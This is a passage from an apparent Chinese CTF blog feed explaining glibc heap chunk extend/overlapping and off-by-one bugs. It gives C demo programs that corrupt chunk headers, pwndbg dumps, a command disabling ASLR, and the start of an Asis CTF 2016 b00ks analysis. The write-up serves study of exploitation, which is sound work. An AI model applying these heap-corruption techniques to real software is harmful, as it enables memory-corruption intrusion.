class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx  0x602000</span><br><span class="line">0x602000:0x00000000000000000x00000000000000b1</span><br><span class="line">0x602010:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000900x0000000000000020</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000020f51</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>继续malloc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; info locals </span><br><span class="line">p = 0x602010</span><br><span class="line">q = 0x602010</span><br></pre></td></tr></table></figure><p>依然可以达到对chunk2进行控制。</p><h3 id="示例4：通过extend后向overlapping"><a href="#示例4：通过extend后向overlapping" class="headerlink" title="示例4：通过extend后向overlapping"></a>示例4：通过extend后向overlapping</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x10 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">long</span> *)((<span class="keyword">long</span>)p - <span class="number">0x8</span>) = <span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602000 ◂— 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>在 malloc(0x50) 后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack</p><h3 id="示例5：通过-extend-前向-overlapping"><a href="#示例5：通过-extend-前向-overlapping" class="headerlink" title="示例5：通过 extend 前向 overlapping"></a>示例5：通过 extend 前向 overlapping</h3><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块。</p><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q, *r, *t;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    r = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    t = <span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)t - <span class="number">0x8</span>) = <span class="number">0x90</span>;<span class="comment">//修改prev_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)t - <span class="number">0x10</span>) = <span class="number">0xd0</span>;<span class="comment">//修改prev_size域</span></span><br><span class="line">    <span class="built_in">free</span>(t);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的几个malloc后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000091 &lt;=chunk1</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000 &lt;=chunk1_end</span><br><span class="line">0x602090:0x00000000000000000x0000000000000021 &lt;=chunk2</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000021 &lt;=chunk3</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000091 &lt;=chunk4</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000 &lt;=chunk4_end</span><br><span class="line">0x602160:0x00000000000000000x0000000000000021</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000020e81</span><br><span class="line">0x602190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602200:0x00000000000000000x0000000000000000</span><br><span class="line">0x602210:0x00000000000000000x0000000000000000</span><br><span class="line">0x602220:0x00000000000000000x0000000000000000</span><br><span class="line">0x602230:0x00000000000000000x0000000000000000</span><br><span class="line">0x602240:0x00000000000000000x0000000000000000</span><br><span class="line">0x602250:0x00000000000000000x0000000000000000</span><br><span class="line">0x602260:0x00000000000000000x0000000000000000</span><br><span class="line">0x602270:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>修改prev_inuse域和prev_size后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/60gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x0000000000000091</span><br><span class="line">0x602010:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000900x0000000000000020</span><br><span class="line">0x6020a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000d00x0000000000000090</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000021</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000020e81</span><br><span class="line">0x602190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>注意0x602097和0x6020d7。此时chunk1为之前malloc的4个大小之和。</p><p>通过修改prev_size域和prev_inuse域可以跨越多个chunk进行合并。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Chunk-Extend-and-Overlapping&quot;&gt;&lt;a href=&quot;#Chunk-Extend-and-Overlapping&quot; class=&quot;headerlink&quot; title=&quot;Chunk Extend and Overla</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>堆中的off-by-one</title>
    <link href="http://example.com/2021/03/21/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/"/>
    <id>http://example.com/2021/03/21/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</id>
    <published>2021-03-20T18:29:42.000Z</published>
    <updated>2021-06-02T01:56:30.004Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>off-by-one是一种特殊的溢出漏洞，off-by-one指程序向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数，并且只越界了一个字节。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这种漏洞的产生往往与边界严重不严格和字符串操作有关，其中边界验证不严通常包括：</p><ul><li>  使用循环写入时，循环的次数设置有误。</li><li>  字符串操作不合适</li></ul><p>一般来说，单字节溢出很难利用，但是因为Linux的堆管理机制ptmalloc验证的松散性，基于Linux堆的off-by-one是可以基于各种缓冲区的，比如栈，bss段等，但是堆上的off-by-one是CTF中比较常见的，这里仅讨论heap上的off-by-one情况。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li> 溢出字节为可控制任意字节：通过修改大小造成块之间出现重叠，从而泄露其他块的数据，或是覆盖其他块数据。也可使用NULL字节溢出的方法。</li><li>溢出字节为NULL字节：溢出NULL字节可以使得<code>prev_in_use</code>位被清，这样前一个块会被认为是free块<ol><li> 这时可以选择使用unlink方法。（unlink部分之后再写）</li><li> 另外这时<code>prev_size</code>就会启用，就可以伪造<code>prev_size</code>从而造成块之间发生重叠。此方法的关键在于unlink的时候没有检查按照<code>prev_size</code>找到的块的大小与<code>prev_size</code>是否一致、</li></ol></li></ol><p>在最新版的代码中已加入针对2中后一种方法的check，但在2.28之前并没有该check。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入17*‘a’后会发现数据覆盖到了下一个堆块的prev_size。</p><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过调试可以发现next chunk 的size域的低字节被结束符<code>\x00</code>覆盖，</p><p>这属于off-by-one的一个分支，叫做NULL byte off-by-one，之后会看到off-by-one与NULL byte off-by-one在利用上的区别。</p><h2 id="实例1：Asis-CTF-2016-b00ks"><a href="#实例1：Asis-CTF-2016-b00ks" class="headerlink" title="实例1：Asis CTF 2016 b00ks"></a>实例1：Asis CTF 2016 b00ks</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ file b00ks </span><br><span class="line">b00ks: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=cdcd9edea919e679ace66ad54da9281d3eb09270, stripped</span><br><span class="line">yutao@pwnbaby:~/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks$ checksec b00ks</span><br><span class="line">[*] &#x27;/home/yutao/ctf-challenges/pwn/heap/off_by_one/Asis_2016_b00ks/b00ks&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>是一个图书管理系统。</p><p><strong>关闭aslr：</strong></p><blockquote><p>  <strong>echo 0 &gt; /proc/sys/kernel/randomize_va_space</strong></p></blockquote><p><strong>重启虚拟机之后aslr会自动开启。</strong></p><p>程序流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><h3 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h3><p>先确定size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>);</span><br><span class="line">ptr = <span class="built_in">malloc</span>(v1)</span><br></pre></td></tr></table></figure><p>之后是description大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">v5 = <span class="built_in">malloc</span>(v1);</span><br></pre></td></tr></table></figure><p>再之后分配book：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter book description: &quot;</span>);</span><br><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">*((_DWORD *)v3 + <span class="number">6</span>) = v1;<span class="comment">//size</span></span><br><span class="line">*((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">*((_QWORD *)v3 + <span class="number">2</span>) = v5;<span class="comment">//description</span></span><br><span class="line">*((_QWORD *)v3 + <span class="number">1</span>) = ptr;<span class="comment">// book_name</span></span><br><span class="line">*(_DWORD *)v3 = ++unk_202024;<span class="comment">//id</span></span><br></pre></td></tr></table></figure><p>可以得到一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;<span class="comment">//offset:0</span></span><br><span class="line">    <span class="keyword">char</span>* name_ptr;<span class="comment">//offset:8</span></span><br><span class="line">    <span class="keyword">char</span>* description_ptr;<span class="comment">//offset:16</span></span><br><span class="line">    <span class="keyword">int</span> size;<span class="comment">//offset:24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最多20本书。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B24</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)off_202010 + i) )</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 ; void *off_202008</span><br><span class="line">.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_980+17↑r</span><br><span class="line">.data:0000000000202008                                         ; .data:off_202008↓o</span><br><span class="line">.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; sub_BBD:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: sub_B6D+15↑o</span><br><span class="line">.data:0000000000202018                                         ; sub_D1F+CA↑o</span><br><span class="line">.data:0000000000202018 _data           ends</span><br></pre></td></tr></table></figure><ul><li>  off_202018地址中存放的是<strong>图书作者名指针</strong>，这个指针指向的地址是unk_202040</li><li>  off_202010地址中存放的是<strong>图书的结构体指针</strong>，这个指针指向的地址为unk_202060</li></ul><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span 